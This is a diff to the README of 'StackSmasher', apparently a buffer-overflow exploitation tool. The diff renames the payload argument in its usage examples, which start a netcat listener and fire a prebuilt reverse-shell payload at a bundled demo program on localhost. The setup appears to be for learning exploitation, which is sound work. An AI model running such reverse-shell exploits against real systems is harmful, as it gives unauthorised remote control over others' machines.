@@ -37,12 +37,12 @@ make
 
 ## Running StackSmasher
 ### Verbose Mode
-Running smasher in *verbose* mode with the prebuild payload (reverse shell on 127.0.0.1:1337) against the application *vulnerable*.
+Running smasher in *verbose* mode with the prebuild reverse shell (127.0.0.1:1337) payload against the application *vulnerable*.
 
 ```sh
 cd bin
 chmod +x smasher vulnerable
-./smasher verbose payload vulnerable
+./smasher verbose reverse-shell vulnerable
 ```
 
 Example Output:
@@ -65,7 +65,7 @@ cd bin
 ```
 
 ### Exploit Mode
-Running smasher in *exploit* mode with the prebuild payload (reverse shell on 127.0.0.1:1337) against the application *vulnerable*.
+Running smasher in *exploit* mode with the prebuild reverse shell (127.0.0.1:1337) payload against the application *vulnerable*.
 
 Listen For Shell:
 ```sh
@@ -74,7 +74,7 @@ nc -lkp 1337
 
 Executing Payload:
 ```sh
-./vulnerable $(./smasher exploit payload vulnerable)
+./vulnerable $(./smasher exploit reverse-shell vulnerable)
 ```
 
 ![StackSmasher](https://user-images.githubusercontent.com/31845045/108642265-06a30800-749c-11eb-88bb-40d9aa6c987b.png)
